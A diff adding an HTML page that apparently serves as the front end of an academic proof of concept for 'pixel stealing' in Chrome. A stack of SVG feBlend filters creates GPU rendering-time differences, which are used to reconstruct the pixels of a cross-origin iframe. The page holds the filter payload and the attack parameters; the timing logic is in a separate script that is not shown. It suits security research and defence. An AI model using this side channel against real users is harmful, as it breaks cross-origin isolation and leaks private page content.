@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Security-Policy"
+    content="frame-src http://0.0.0.0:8000/ https://en.wikipedia.org/wiki/Main_Page https://homes.cs.washington.edu/ https://www.cs.utexas.edu/~yingchen/">
+
+  <title>SVG on Chrome GPU Pixel Stealing</title>
+  <style>
+    html,
+    body {
+      width: 100%;
+      height: 100%;
+      margin: 0;
+      padding: 0;
+    }
+
+    #url {
+      width: 280px;
+    }
+
+    #status {
+      color: red;
+      font-family: monospace;
+      font-size: 30px
+    }
+
+    #frame-reference {
+      height: 100px;
+      width: 100px;
+    }
+
+    .white {
+      background: white;
+    }
+
+    .black {
+      background: black;
+    }
+
+    .timing1 {
+      filter: url(#filter1);
+    }
+
+    .timing2 {
+      filter: url(#filter2);
+    }
+
+    .svg-textarea {
+      width: 500px;
+      height: 200px;
+    }
+
+    .hidden {
+      visibility: hidden;
+    }
+  </style>
+  <script type="text/javascript" src="chrome.js"></script>
+</head>
+
+<body>
+
+  <div id="status">Ready!</div>
+  <div id="debug"></div>
+
+  Reference:
+  <div id="reference-container" style="overflow: hidden;
+    	width:48px; height:48px;
+    	border-style:solid;border-color:red;">
+    <iframe id="frame-reference" position="absolute" scrolling="no"
+      src="https://homes.cs.washington.edu/~dkohlbre/floats/48px_wb_cb.png" frameborder="0"></iframe>
+  </div>
+  <svg height="0">
+    <filter id="threshold">
+      <feColorMatrix type="matrix" values=" 0.21 0.72 0.07 0 0
+                                                      0.21 0.72 0.07 0 0
+                                                      0.21 0.72 0.07 0 0
+                                                      0    0    0    1 0 " />
+      <feComponentTransfer>
+        <feFuncR type="discrete" tableValues="0 1" />
+        <feFuncG type="discrete" tableValues="0 1" />
+        <feFuncB type="discrete" tableValues="0 1" />
+      </feComponentTransfer>
+    </filter>
+  </svg>
+  </div>
+  <br>
+
+  Reconstruction <br><canvas id="canvas" style="border-style:solid;border-color:green" width="48" height="48"></canvas>
+  <br>
+  <br>
+  <br>
+  <br>
+
+  <div id="filter-input-container">
+    <p>Filter code:</p>
+    <textarea id="filter-input" spellcheck="false" class="svg-textarea" readonly>
+      <filter>    
+
+        <feTurbulence type="turbulence" baseFrequency="0.9 0.9" 
+        numOctaves="1" seed="1" stitchTiles="stitch" x="0" y="0" width="2000px" height="2000px" result="turbulence"/>
+        <feBlend in="SourceGraphic" in2="turbulence" mode="multiply" result="x1"/>
+        <feBlend in="SourceGraphic" in2="x1" mode="multiply" result="x2"/>
+        <feBlend in="SourceGraphic" in2="x2" mode="multiply" result="x3"/>
+        <feBlend in="SourceGraphic" in2="x3" mode="multiply" result="x4"/>
+        <feBlend in="SourceGraphic" in2="x4" mode="multiply" result="x5"/>
+        <feBlend in="SourceGraphic" in2="x5" mode="multiply" result="x6"/>
+        <feBlend in="SourceGraphic" in2="x6" mode="multiply" result="x7"/>
+        <feBlend in="SourceGraphic" in2="x7" mode="multiply" result="x8"/>
+        <feBlend in="SourceGraphic" in2="x8" mode="multiply" result="x9"/>
+        <feBlend in="SourceGraphic" in2="x9" mode="multiply" result="x10"/>
+        <feBlend in="SourceGraphic" in2="x10" mode="multiply" result="x11"/>
+        <feBlend in="SourceGraphic" in2="x11" mode="multiply" result="x12"/>
+        <feBlend in="SourceGraphic" in2="x12" mode="multiply" result="x13"/>
+        <feBlend in="SourceGraphic" in2="x13" mode="multiply" result="x14"/>
+        <feBlend in="SourceGraphic" in2="x14" mode="multiply" result="x15"/>
+        <feBlend in="SourceGraphic" in2="x15" mode="multiply" result="x16"/>
+        <feBlend in="SourceGraphic" in2="x16" mode="multiply" result="x17"/>
+        <feBlend in="SourceGraphic" in2="x17" mode="multiply" result="x18"/>
+        <feBlend in="SourceGraphic" in2="x18" mode="multiply" result="x19"/>
+        <feBlend in="SourceGraphic" in2="x19" mode="multiply" result="x20"/>
+        <feBlend in="SourceGraphic" in2="x20" mode="multiply" result="x21"/>
+        <feBlend in="SourceGraphic" in2="x21" mode="multiply" result="x22"/>
+        <feBlend in="SourceGraphic" in2="x22" mode="multiply" result="x23"/>
+        <feBlend in="SourceGraphic" in2="x23" mode="multiply" result="x24"/>
+        <feBlend in="SourceGraphic" in2="x24" mode="multiply" result="x25"/>
+        <feBlend in="SourceGraphic" in2="x25" mode="multiply" result="x26"/>
+        <feBlend in="SourceGraphic" in2="x26" mode="multiply" result="x27"/>
+        <feBlend in="SourceGraphic" in2="x27" mode="multiply" result="x28"/>
+        <feBlend in="SourceGraphic" in2="x28" mode="multiply" result="x29"/>
+        <feBlend in="SourceGraphic" in2="x29" mode="multiply" result="x30"/>
+        <feBlend in="SourceGraphic" in2="x30" mode="multiply" result="x31"/>
+        <feBlend in="SourceGraphic" in2="x31" mode="multiply" result="x32"/>
+        <feBlend in="SourceGraphic" in2="x32" mode="multiply" result="x33"/>
+        <feBlend in="SourceGraphic" in2="x33" mode="multiply" result="x34"/>
+        <feBlend in="SourceGraphic" in2="x34" mode="multiply" result="x35"/>
+        <feBlend in="SourceGraphic" in2="x35" mode="multiply" result="x36"/>
+        <feBlend in="SourceGraphic" in2="x36" mode="multiply" result="x37"/>
+        <feBlend in="SourceGraphic" in2="x37" mode="multiply" result="x38"/>
+        <feBlend in="SourceGraphic" in2="x38" mode="multiply" result="x39"/>
+        <feBlend in="SourceGraphic" in2="x39" mode="multiply" result="x40"/>
+        
+        </filter>  
+      </textarea>
+  </div>
+  <div>
+    <input type="checkbox" id="test-mode" name="test-mode" checked>
+    <label for="test-mode">Test mode? (Only print black/white render time difference, without pixel stealing
+      attack)</label>
+  </div>
+  <button id="runButton" onclick="reconstruct();"> Run</button>
+
+  <!-- how long to collect -->
+  <div> Time (ms) <input id="time" type="number" value="2000"> </div>
+  <!-- repetition increases in the same round -->
+  <div> repetition <input id="repetition" type="number" value="100"> </div>
+
+  <div> stress <input id="stress_type" type="number" value="1"> </div>
+  <div> warmup time (s)<input id="warmup_time" type="number" value="300"> </div>
+
+  <div> Div Size <input id="div_size" type="number" value="2000"> </div>
+  <div> Layer <input id="layer" type="number" value="40"> </div>
+
+  <div> threshold low <input id="low" type="number" value="0.5"> </div>
+  <div> threshold high <input id="high" type="number" value="0.8"> </div>
+
+  <div> number of workers <input id="num_workers" type="number" value="16"> </div>
+  <div> BigInt digits <input id="bigint_digits" type="number" value="32"> </div>
+
+  <!-- Without this rotateY trick, the GPU implementation would never attempt to fire, said by the paper "On the effectiveness of mitigations against floating-point timing channels" -->
+  <!-- This gets overwritten when the attack starts -->
+  <div id="pixel" style="overflow:hidden;transform: rotateY(1deg);">
+    <iframe id="frame" style="width:2000px;height:2000px;" frameborder="0" scrolling="no"
+      src="chrome-embed-zoom-scroll.html"></iframe>
+  </div>
+
+  <svg height="0" id="input-filter1">
+  </svg>
+  <svg height="0" id="input-filter2">
+  </svg>
+
+</body>
+
+</html>
